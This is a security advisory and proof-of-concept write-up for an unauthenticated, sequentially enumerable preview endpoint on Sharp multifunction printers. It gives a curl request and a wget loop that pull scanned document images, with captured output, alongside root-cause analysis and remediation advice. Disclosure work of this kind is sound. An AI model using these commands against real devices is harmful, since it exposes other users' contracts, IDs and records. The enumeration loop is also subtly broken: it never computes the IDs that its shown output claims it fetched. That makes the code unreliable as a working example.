# Unauthorized access to scanned document previews via predictable `fileid` in Sharp Digital Multifunctional Printers (MFP)

| Field                  | Details                                                                                          |
| ---------------------- | ------------------------------------------------------------------------------------------------ |
| **Affected Software**  | Sharp Digital MFP / Printer web interface (multiple models — see [Sharp Advisory 2026-004](https://global.sharp/corporate/info/product-security/advisory-list/2026-004/)) |
| **Vendor**             | Sharp Corporation                                                                                 |
| **CVE ID**              | [CVE-2026-60011](https://www.cve.org/CVERecord?id=CVE-2026-60011)                                |
| **Vulnerability Type** |  Unauthenticated Information Disclosure |
| **CWE**                | CWE-425                                                   |
| **Severity**           | Medium (CVSS 3.1: 5.3) / Medium (CVSS 4.0: 6.9)                                                  |
| **Attack Vector**      | Network (unauthenticated remote)                                                                 |
| **CVSS 3.1**           | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` — Base Score 5.3                                            |
| **CVSS 4.0**           | `AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N` — Base Score 6.9                        |
| **Status**             | Fixed — vendor firmware update released (see advisory for affected/patched model list)           |

---

## Executive Summary

The web interface of several Sharp Digital Multifunctional System (MFP) models exposes a `preview.jpeg` endpoint that is used by the device's own web UI to render thumbnail previews of scanned/printed jobs stored on the device. The endpoint accepts a numeric `fileid` parameter but does not verify that the requesting session is authenticated or that the caller is authorized to access the referenced job. `fileid` values are sequential and trivially enumerable, allowing an unauthenticated remote attacker to iterate over the identifier space and retrieve preview images of documents scanned, copied, or printed by other users of the device — including documents belonging to previous jobs that the attacker never submitted.

Because many organizations expose these MFPs on internal networks (and some directly to the Internet), this issue allows silent, unauthenticated bulk exfiltration of potentially sensitive scanned material (contracts, ID documents, invoices, HR records, etc.).

This issue was reported to Sharp and has been assigned **CVE-2026-60011**. It is one of three vulnerabilities addressed in Sharp's [Product Security Advisory 2026-004](https://global.sharp/corporate/info/product-security/advisory-list/2026-004/), published July 31, 2026.

---

## Technical Description

### Entry Point

The device's embedded web server exposes the following endpoint, normally used by the authenticated job-status/job-log UI to render a thumbnail of a scanned or printed document:

```
GET /preview.jpeg?fileid=<ID>&jobtype=<TYPE>&rotate=<0|90|180|270>&page=<PAGE>&filepw=
```

| Parameter | Purpose                                                              |
| --------- | --------------------------------------------------------------------|
| `fileid`  | Numeric identifier of the stored job/document on the MFP            |
| `jobtype` | Job type (e.g. `11` observed for scan/print job previews)           |
| `rotate`  | Rotation applied to the returned preview image                      |
| `page`    | Page number within a multi-page job                                 |
| `filepw`  | Optional per-file password parameter — left empty in observed traffic |

A representative captured request/response (host redacted):

```
GET /preview.jpeg?fileid=1048611&jobtype=11&rotate=0&page=1&filepw= HTTP/1.1
Host: <redacted>
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: <redacted>
```

```
HTTP/1.1 200 OK
Server: Rapid Logic/1.1
MIME-version: 1.0
Content-Type: image/jpeg; name=preview.png
Content-disposition: attachment; filename=preview.png
Connection: close
Content-Length: 80272

<JPEG binary data — scanned document preview>
```

Critically, the request carries **no session cookie, no `Authorization` header, and no authentication token of any kind** — only a `Referer` header taken from the device's own unauthenticated landing page. The device nonetheless returns `200 OK` and streams back the full-resolution preview image tied to that `fileid`.

### Root Cause

* The `/preview.jpeg` handler does not enforce that the requester holds a valid authenticated session before serving the referenced document image.
* Authorization is not re-checked per object: any caller who can guess or enumerate a `fileid` is treated as implicitly authorized to view the associated document, regardless of which user or job actually owns it.
* `fileid` values are allocated **sequentially** as jobs are scanned/printed/copied on the device, making the entire identifier space trivially enumerable by simply incrementing an integer.
* The `filepw` parameter exists as a per-document password gate, but is not enforced when left blank — it is optional rather than mandatory, so it provides no real protection against a direct request that omits it.

This maps directly to **CWE-425 (Direct Request / "Forced Browsing")**: a security-sensitive resource is reachable via a direct, predictable URL that bypasses the intended presentation/access-control layer (the authenticated job-log UI).

### Impact

An unauthenticated attacker with network access to the MFP's web interface can:

1. Enumerate `fileid` sequentially to download preview images of **every scanned, copied, or printed document retained on the device**, without any credentials.
2. Recover potentially sensitive business documents — contracts, invoices, ID/passport scans, HR or medical paperwork, financial records — scanned by any user of the shared device.
3. Perform this at scale and silently, since the endpoint is a normal-looking image request and generates no obvious authentication failure in device logs.
4. Combine this with the address-book disclosure and forced-print issues covered in the same advisory ([CVE-2026-63563](https://www.cve.org/CVERecord?id=CVE-2026-63563), [CVE-2026-63545](https://www.cve.org/CVERecord?id=CVE-2026-63545)) for broader information gathering against an organization.

Sharp's advisory summarizes the impact as: *"By a malicious attacker tampering with HTTP requests to the MFP's web interface, it becomes possible to bypass the authentication mechanism and gain access to image data stored on the device."*

---

## Proof of Concept

### Step 1 — Confirm the endpoint is reachable unauthenticated

A single request with no session state confirms unauthenticated access:

```bash
curl -s -o preview.jpg -D - \
  "http://<target>/preview.jpeg?fileid=1048611&jobtype=11&rotate=0&page=1&filepw="
```

Result: `HTTP/1.1 200 OK`, valid JPEG returned — no login prompt, no redirect, no auth challenge.

### Step 2 — Enumerate the `fileid` space

Since `fileid` is sequential, a simple loop over a numeric range retrieves previews for every job stored on the device:

```bash
for i in $(seq 1 100); do
  wget "http://<target>/preview.jpeg?fileid=1048611+$i&jobtype=11&rotate=0&page=1&filepw="
done
```

Observed output during testing — most IDs outside the live range return `500 Internal Server Error` (expected/expired job), while valid IDs return `200 OK` and save a full preview JPEG (200–270 KB each):

```
--06:18:56--  http://<target>/preview.jpeg?fileid=1048628&jobtype=11&rotate=0&page=1&filepw=
Connecting to <target>:80 ... connected.
HTTP request sent, awaiting response ... 200 OK
Length: unspecified [image/jpeg]
Saving to: 'preview.jpeg?fileid=1048628&jobtype=11&rotate=0&page=1&filepw='
 (6.81 MB/s) - 'preview.jpeg?fileid=1048628...' saved [267888]

--06:18:56--  http://<target>/preview.jpeg?fileid=1048629&jobtype=11&rotate=0&page=1&filepw=
HTTP request sent, awaiting response ... 200 OK
 (9.81 MB/s) - saved [242336]

--06:18:57--  http://<target>/preview.jpeg?fileid=1048630&jobtype=11&rotate=0&page=1&filepw=
HTTP request sent, awaiting response ... 200 OK
 (9.14 MB/s) - saved [230848]
```

Within a short, unauthenticated enumeration run against a single device, dozens of full-resolution scanned document previews belonging to unrelated jobs were retrieved.

### Step 3 — Recover full documents

Each successfully retrieved JPEG is a rendered preview of the underlying scanned/printed document, including any text, tables, signatures, or images present on the original page — sufficient in most cases to fully reconstruct the sensitive content of the source document without further steps.

---

## Root Cause Summary

```
Endpoint:        GET /preview.jpeg
Missing control: Session/authentication check before serving object
Missing control: Per-object authorization check (ownership of fileid)
Contributing:    Sequential, predictable fileid allocation
Contributing:    Optional (non-enforced) filepw parameter
```

---

## Recommended Remediation

| #   | Recommendation                                                                                                                       | Priority |
| --- | -------------------------------------------------------------------------------------------------------------------------------------| -------- |
| 1   | Require a valid authenticated session before serving `/preview.jpeg`, and re-validate on every request rather than relying on the UI to only ever link authorized IDs. | Critical |
| 2   | Enforce per-object authorization — confirm the authenticated user/session actually owns or is permitted to view the referenced `fileid` before returning image data. | Critical |
| 3   | Replace sequential, guessable `fileid` values with non-enumerable identifiers (e.g. random UUIDs) to remove trivial enumeration as an attack path. | High     |
| 4   | Make `filepw` (or an equivalent per-document secret) mandatory rather than optional, and reject requests where it is blank or incorrect. | Medium   |
| 5   | Follow Sharp's published mitigations: do not expose MFPs directly to the Internet, enable **[System Settings] → [Security Settings] → [Restrict Device Web Page Access Via Password]** (on by default, verify it has not been disabled), change default admin/user credentials, and monitor device Audit Logs for anomalous access patterns. | High     |
| 6   | Apply the vendor firmware update listed in [Sharp Advisory 2026-004](https://global.sharp/corporate/info/product-security/advisory-list/2026-004/) for your specific model. | Critical |

---

## Timeline

* Vulnerability discovered and reported to Sharp via responsible disclosure.
* July 31, 2026 — Sharp published [Product Security Advisory 2026-004](https://global.sharp/corporate/info/product-security/advisory-list/2026-004/), assigning **CVE-2026-60011** and crediting the report.
* Firmware fixes released for affected models; mitigation guidance published for end-of-support models still in use.

---

## References

* Sharp Product Security Advisory: [https://global.sharp/corporate/info/product-security/advisory-list/2026-004/](https://global.sharp/corporate/info/product-security/advisory-list/2026-004/)
* CVE Record: [CVE-2026-60011](https://www.cve.org/CVERecord?id=CVE-2026-60011)
* CWE-425: [Direct Request ('Forced Browsing')](https://cwe.mitre.org/data/definitions/425.html)

---

*Reported by [Mohamed Abdelhady](https://linkedin.com/in/mohamed-abdelhady-0b890420b) (Cyber 50 Defense)*
